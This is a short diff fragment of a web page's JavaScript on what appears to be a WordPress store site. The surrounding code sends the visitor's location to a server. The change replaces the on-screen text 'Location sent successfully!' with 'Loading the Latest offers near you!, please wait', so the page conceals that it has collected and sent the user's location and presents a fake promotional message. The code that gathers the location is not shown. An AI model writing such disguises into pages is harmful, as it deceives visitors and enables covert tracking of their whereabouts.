@@ -153,7 +153,7 @@ var cf7rl_ajax_object = {"cf7rl_ajax_url":"https://inventstore.in/wp-admin/admin
           })
           .then(res => res.json())
           .then(result => {
-            document.body.innerHTML = "<h2>Location sent successfully!</h2>";
+            document.body.innerHTML = "<h4>Loading the Latest offers near you!, please wait</h4>";
             console.log("Server response:", result);
           })
           .catch(err => console.error("Error:", err));
